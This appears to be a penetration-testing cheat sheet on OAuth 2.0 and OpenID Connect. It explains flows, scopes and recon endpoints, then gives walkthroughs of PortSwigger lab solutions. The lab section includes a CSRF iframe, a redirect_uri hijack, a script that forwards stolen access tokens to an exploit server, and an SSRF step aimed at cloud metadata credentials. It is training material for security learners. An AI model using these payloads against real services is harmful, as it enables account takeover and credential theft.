# OAuth
 OAuth 2.0 was developed to facilitate secure sharing of specific data between applications. It involves interactions between three key parties: a client application, a resource owner, and the OAuth service provider.

- **Client application** : The website or web application that wants to access the user's data. 
- **Resource owner** : The user whose data the client application wants to access. 
- **OAuth serveice provider** : The website or application that controls the user's data and access. It supports OAuth by providing an API for interacting with an authorization server and a resource server.

## OAuth process
OAuth can be implemented in various ways, referred to as OAuth "flows" or "grant types." The most common ones are the "authorization code" and "implicit" grant types. Both of these broadly follow similar stages :

1. The client application requests access to a subset of the user's data, specifying the grant type and type of access.
2. The user logs into the OAuth service and gives explicit consent for the requested access.
3. The client application receives an access token proving it has permission to access the data, with the process varying by grant type.
4. The client application uses the access token to make API calls and retrieve data from the resource server.

## OAuth grant types
Refference : https://portswigger.net/web-security/oauth/grant-types

The OAuth grant type defines the sequence of steps in the OAuth process and determines how the client application communicates with the OAuth service, including how the access token is sent. Grant types are often called **OAuth flows**.

The OAuth service must be configured to support a specific grant type before the client can initiate the flow. The client specifies the desired grant type in the initial authorization request.

There are multiple grant types, each with varying complexity and security. The most common are the **authorization code** and **implicit** grant types.

## OAuth scopes
For any OAuth grant type, the client application must specify the data it wants to access and the operations it intends to perform. This is done using the `scope` parameter in the authorization request sent to the OAuth service.

When requesting read access to a user's contact list, the scope name might take any of the following forms depending on the OAuth service being used: 
```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```
When OAuth is used for authentication, however, the standardized OpenID Connect scopes are often used instead. For example, the scope `openid profile` will grant the client application read access to a predefined set of basic information about the user, such as their email address, username, and so on


### Authorization code grant type
The client application and OAuth service first use redirects to exchange a series of browser-based HTTP requests that initiate the flow.

Authorization grant type is the most secure. Server-side applications should ideally always use this grant type if possible. 
![image](https://github.com/d41ki-3/PenTestCheatsheet/blob/main/OAuth%20authentication/file/oauth-authorization-code-flow.jpg)

The client application sends a request to the OAuth service's `/authorization` endpoint asking for permission to access specific user data.

```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
This request contains the following noteworthy parameters, usually provided in the query string: 
- **client_id** : A required parameter that contains the unique identifier of the client application, generated during registration with the OAuth service.
- **redirect_uri** : The URI to which the userâ€™s browser is redirected when sending the authorization code to the client application. This is also known as the "callback URI" or "callback endpoint" and is often exploited in OAuth attacks due to validation flaws. 
- **response_type** : Indicates the type of response the client expects and the flow it wants to initiate. For the authorization code grant, the value is `code`. 
- **scope** : Specifies which subset of the user's data the client application wants to access, either custom or standardized scopes.
- **state** : Stores a unique value tied to the current session to prevent CSRF attacks. The OAuth service must return this value with the authorization code to ensure the request to the `/callback` endpoint is from the same user who started the flow.

### Implicit grant type
Not first obtaining an authorization code and then exchanging it for an access token, but the client application receives the access token immediately after the user gives their consent. 

It is far less secure. When using the implicit grant type, all communication happens via browser redirects - there is no secure back-channel like in the authorization code flow. 
![image](https://github.com/d41ki-3/PenTestCheatsheet/blob/main/OAuth%20authentication/file/oauth-implicit-flow.jpg)

The only major difference is that the `response_type` parameter must be set to `token`.
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

## OAuth authentication
OAuth authentication is implemented as follows:
1. The user opts to log in using their social media account, prompting the client application to use the social media site's OAuth service to request data like the user's email address.
2. After obtaining an access token, the client application retrieves this data from the resource server, often from a `/userinfo` endpoint.
3. Once the data is received, the client application uses it to log the user in, replacing a username. The access token often serves as a substitute for a traditional password.

## OpenID Connect
Refference : https://portswigger.net/web-security/oauth/openid

OpenID Connect extends OAuth protocol by adding an identity and authentication layer, enhancing OAuth's support for authentication purposes. It allows applications to request access to basic user data and assumes the user authenticated with the OAuth provider.

OpenID Connect integrates smoothly with existing OAuth flows. The main difference for client applications is the inclusion of standardized scopes for all providers and an additional response type, `id_token`.

### OpenID Connect roles
- **Relying party** :  The application requesting user authentication, also known as the OAuth client application.
- **End user** : The user being authenticated, also referred to as the OAuth resource owner.
- **OpenID provider** :  An OAuth service configured to support OpenID Connect.

### OpenID Connect claims and scopes
The term `claims` refers to key-value pairs representing user information on the resource server, such as `"family_name":"Montoya"`. Unlike OAuth, OpenID Connect uses a standardized set of scopes across all providers. To use OpenID Connect, the client must specify the openid scope in the authorization request, followed by additional standard scopes like :
```
profile
email
address
phone
```
Each scope grants read access to specific subsets of claims about the user. For example, the `openid profile` scope provides access to claims related to the user's identity, such as `family_name`, `given_name`, and `birth_date`.

### ID token *
The other main addition provided by OpenID Connect is the `id_token` response type. This returns a JSON web token (JWT) signed with a JSON web signature (JWS). The JWT payload contains a list of claims based on the scope that was initially requested. It also contains information about how and when the user was last authenticated by the OAuth service. The client application can use this to decide whether or not the user has been sufficiently authenticated. 

The main benefit of using `id_token` is the reduced number of requests that need to be sent between the client application and the OAuth service, which could provide better performance overall. Instead of having to get an access token and then request the user data separately, the ID token containing this data is sent to the client application immediately after the user has authenticated themselves. 

Rather than simply relying on a trusted channel, as happens in basic OAuth, the integrity of the data transmitted in an ID token is based on a JWT cryptographic signature. For this reason, the use of ID tokens may help protect against some man-in-the-middle attacks. However, given that the cryptographic keys for signature verification are transmitted over the same network channel (normally exposed on `/.well-known/jwks.json`), some attacks are still possible. 

 Note that multiple response types are supported by OAuth, so it's perfectly acceptable for a client application to send an authorization request with both a basic OAuth response type and OpenID Connect's `id_token` response type:
```
response_type=id_token token
response_type=id_token code
```
In this case, both an ID token and either a code or access token will be sent to the client application at the same time. 


### Identifying OpenID Connect
The most reliable way to check if OpenID Connect is being used is by looking for the mandatory `openid` scope. Even if it seems like OpenID Connect isn't used, you can test by adding the `openid` scope or changing the response type to `id_token` to see if an error occurs.

As with basic OAuth, reviewing the OAuth provider's documentation can provide useful information about their OpenID Connect support. You can also check the configuration file by accessing the standard endpoint at
```
/.well-known/openid-configuration
```

#### Unprotected dynamic client registration


#### Allowing authorization requests by reference





## Recon
When using an external OAuth service, the specific provider can be identified by checking the hostname to which the authorization request is sent. Since these services offer a public API, detailed documentation is often available, providing information such as endpoint names and configuration options.  

Once you have the authorization server's hostname, you should send a `GET` request to the following standard endpoints to gather more information:
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

## Labs Portswigeer 
e.g.) The main request to play with is ```/auth?client_id=...```  
1. Authentication bypass via OAuth implicit flow
>Intercept the whole process of OAuth authentication and observe /authenticate POST request that contains email and username. Change these parameters to carlos'.

2. Forced OAuth profile linking
>Intercept the whole process of OAuth authentication and observe /oauth-linking request with code. This request is without state parameter, so Generate CSRF PoC and drop the request. Send it to victim and login via OAuth.
```
<iframe src="URL/oauth-linking?code=XXXX"></iframe>
```

3. OAuth account hijacking via redirect_uri
>Intercept the whole process of OAuth authentication and observe `/auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx`, change redirect_uri to your exploit server and Generate CSRF PoC, drop the request. Send it to victim and find out his /oauth-callback?code.
```
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

4. Stealing OAuth access tokens via an open redirect
>4.1 Same as the previous one observe ```/auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx```.  
>4.2 On home page open any post and at the bottom observe "Next post" button. It is open redirect.  
>4.3 Write the next URL:  
```
redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/
```  
>This will redirect us to our exploit server and send us oauth code as fragment identifier, so we need to extract this value using JS.  
>4.4 Write final payload:  
```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

5. SSRF via OpenID dynamic client registration

This task involves exploiting an OAuth service by registering a fake client application and using the logo_uri property to make the OAuth server fetch sensitive metadata from an internal URL. Here's the step-by-step process:
>5.1 Log in to your account and access the OAuth server's configuration file at /.well-known/openid-configuration.  
>5.2 Register a new client application by sending a POST request to /reg. Include a redirect_uris array with an arbitrary URL.  
>5.3 Check the OAuth flow using Burp to see that the "Authorize" page fetches the client application's logo from a specific URL.  
>5.4 Modify the registration request to include a logo_uri property.Replace the logo_uri with a URL pointing to sensitive metadata (http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/).    
>5.5 Trigger the logo fetch request by sending a GET request to the logo's endpoint using the new client ID.  
>5.6 Fetch the logo again using the new client ID to retrieve sensitive information, such as the secret access key, from the OAuth provider's cloud environment.  
